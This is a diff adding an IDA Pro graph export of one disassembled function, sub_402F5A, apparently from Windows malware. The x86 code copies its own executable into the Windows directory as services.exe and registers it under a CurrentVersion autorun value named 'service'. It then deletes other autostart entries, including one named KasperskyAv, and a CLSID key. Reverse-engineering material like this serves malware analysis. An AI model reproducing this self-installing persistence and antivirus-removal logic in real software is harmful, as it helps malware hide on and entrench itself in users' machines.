@@ -1,0 +1,221 @@
+graph: {
+title: "Graph of sub_402F5A"
+manhattan_edges: yes
+layoutalgorithm: mindepth
+finetuning: no
+layout_downfactor: 100
+layout_upfactor: 0
+layout_nearfactor: 0
+xlspace: 12
+yspace: 30
+// IDA palette
+colorentry 32: 0 0 0
+colorentry 33: 0 0 255
+colorentry 34: 0 0 255
+colorentry 35: 128 128 128
+colorentry 36: 128 128 128
+colorentry 37: 0 0 128
+colorentry 38: 0 0 128
+colorentry 39: 0 0 255
+colorentry 40: 0 0 255
+colorentry 41: 0 0 128
+colorentry 42: 0 128 0
+colorentry 43: 0 255 0
+colorentry 44: 0 128 0
+colorentry 45: 255 128 0
+colorentry 46: 0 128 0
+colorentry 47: 128 128 255
+colorentry 48: 255 0 0
+colorentry 49: 128 128 0
+colorentry 50: 1 1 1
+colorentry 51: 192 192 192
+colorentry 52: 0 0 255
+colorentry 53: 0 0 255
+colorentry 54: 0 0 255
+colorentry 55: 128 128 128
+colorentry 56: 128 128 255
+colorentry 57: 0 128 0
+colorentry 58: 0 0 128
+colorentry 59: 0 0 255
+colorentry 60: 128 0 128
+colorentry 61: 0 128 0
+colorentry 62: 0 128 0
+colorentry 63: 0 128 64
+colorentry 64: 0 0 128
+colorentry 65: 0 0 128
+colorentry 66: 255 0 255
+colorentry 67: 128 128 0
+colorentry 68: 0 0 128
+colorentry 69: 0 0 255
+colorentry 70: 0 0 128
+colorentry 71: 0 0 255
+colorentry 72: 0 0 0
+colorentry 73: 255 255 255
+colorentry 74: 192 192 192
+colorentry 75: 0 255 255
+colorentry 76: 0 0 0
+colorentry 77: 128 0 0
+colorentry 78: 128 128 128
+colorentry 79: 128 128 0
+colorentry 80: 255 0 255
+colorentry 81: 0 0 0
+colorentry 82: 0 0 255
+colorentry 83: 0 0 0
+node: { title: "0" label: "58sub_402F5A31:
+push    ebp
+mov     ebp, esp
+sub     esp, 824h
+push    ebx
+push    esi
+mov     esi, 400h
+push    edi
+lea     eax, [ebp+ExistingFileName]
+push    esi             ; nSize
+xor     edi, edi
+push    eax             ; lpFilename
+push    edi             ; hModule
+call    GetModuleFileNameA
+lea     eax, [ebp+NewFileName]
+push    esi             ; uSize
+push    eax             ; lpBuffer
+call    GetWindowsDirectoryA
+lea     eax, [ebp+NewFileName]
+push    eax             ; Str
+call    _strlen
+cmp     [ebp+eax+var_425], 5Ch
+pop     ecx
+jz      short loc_402FB4" vertical_order: 0 }
+node: { title: "1" label: "7600402FA131:
+lea     eax, [ebp+NewFileName]
+push    offset Source   ; \"\\\\\"
+push    eax             ; Dest
+call    _strcat
+pop     ecx
+pop     ecx" }
+node: { title: "2" label: "58loc_402FB431:
+lea     eax, [ebp+NewFileName]
+push    offset aServices_exe; \"services.exe\"
+push    eax             ; Dest
+call    _strcat
+pop     ecx
+lea     eax, [ebp+NewFileName]
+pop     ecx
+push    edi             ; bFailIfExists
+push    eax             ; lpNewFileName
+lea     eax, [ebp+ExistingFileName]
+push    eax             ; lpExistingFileName
+call    CopyFileA
+lea     eax, [ebp+NewFileName]
+push    offset aServ    ; \" -serv\"
+push    eax             ; Dest
+call    _strcat
+mov     esi, RegOpenKeyA
+pop     ecx
+pop     ecx
+lea     eax, [ebp+hKey]
+push    eax             ; phkResult
+mov     ebx, 80000002h
+push    offset SubKey   ; \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi\"...
+push    ebx             ; hKey
+call    esi ; RegOpenKeyA
+lea     eax, [ebp+NewFileName]
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; cbData
+lea     eax, [ebp+NewFileName]
+push    eax             ; lpData
+push    1               ; dwType
+push    edi             ; Reserved
+push    offset ValueName; \"service\"
+push    [ebp+hKey]      ; hKey
+call    RegSetValueExA
+push    [ebp+hKey]      ; hKey
+mov     edi, RegCloseKey
+call    edi ; RegCloseKey
+lea     eax, [ebp+hKey]
+push    eax             ; phkResult
+push    offset SubKey   ; \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi\"...
+push    ebx             ; hKey
+call    esi ; RegOpenKeyA
+mov     ebx, RegDeleteValueA
+push    offset aTaskmon ; \"Taskmon\"
+push    [ebp+hKey]      ; hKey
+call    ebx ; RegDeleteValueA
+push    [ebp+hKey]      ; hKey
+call    edi ; RegCloseKey
+lea     eax, [ebp+hKey]
+push    eax             ; phkResult
+push    offset SubKey   ; \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi\"...
+push    80000001h       ; hKey
+call    esi ; RegOpenKeyA
+push    offset aTaskmon ; \"Taskmon\"
+push    [ebp+hKey]      ; hKey
+call    ebx ; RegDeleteValueA
+push    [ebp+hKey]      ; hKey
+call    edi ; RegCloseKey
+push    offset aClsidE6fb5e20D; \"CLSID\\\\{E6FB5E20-DE35-11CF-9C87-00AA0051\"...
+push    80000000h       ; hKey
+call    RegDeleteKeyA
+lea     eax, [ebp+hKey]
+push    eax             ; phkResult
+push    offset SubKey   ; \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi\"...
+push    80000002h       ; hKey
+call    esi ; RegOpenKeyA
+push    offset aExplorer; \"Explorer\"
+push    [ebp+hKey]      ; hKey
+call    ebx ; RegDeleteValueA
+push    [ebp+hKey]      ; hKey
+call    edi ; RegCloseKey
+lea     eax, [ebp+hKey]
+push    eax             ; phkResult
+push    offset SubKey   ; \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi\"...
+push    80000001h       ; hKey
+call    esi ; RegOpenKeyA
+push    offset aExplorer; \"Explorer\"
+push    [ebp+hKey]      ; hKey
+call    ebx ; RegDeleteValueA
+push    [ebp+hKey]      ; hKey
+call    edi ; RegCloseKey
+lea     eax, [ebp+hKey]
+push    eax             ; phkResult
+push    offset SubKey   ; \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi\"...
+push    80000002h       ; hKey
+call    esi ; RegOpenKeyA
+push    offset aKasperskyav; \"KasperskyAv\"
+push    [ebp+hKey]      ; hKey
+call    ebx ; RegDeleteValueA
+push    [ebp+hKey]      ; hKey
+call    edi ; RegCloseKey
+lea     eax, [ebp+hKey]
+push    eax             ; phkResult
+push    offset SubKey   ; \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi\"...
+push    80000002h       ; hKey
+call    esi ; RegOpenKeyA
+push    offset aSystem_ ; \"system.\"
+push    [ebp+hKey]      ; hKey
+call    ebx ; RegDeleteValueA
+push    [ebp+hKey]      ; hKey
+call    edi ; RegCloseKey
+lea     eax, [ebp+hKey]
+push    eax             ; phkResult
+push    offset aSoftwareMicr_0; \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi\"...
+push    80000002h       ; hKey
+call    esi ; RegOpenKeyA
+push    offset aSystem_ ; \"system.\"
+push    [ebp+hKey]      ; hKey
+call    ebx ; RegDeleteValueA
+push    [ebp+hKey]      ; hKey
+call    edi ; RegCloseKey
+pop     edi
+pop     esi
+pop     ebx
+leave
+retn" vertical_order: 3 }
+// node 0
+edge: { sourcename: "0" targetname: "1" label: "false" color: red }
+edge: { sourcename: "0" targetname: "2" label: "true" color: darkgreen }
+// node 1
+edge: { sourcename: "1" targetname: "2" }
+// node 2
+}
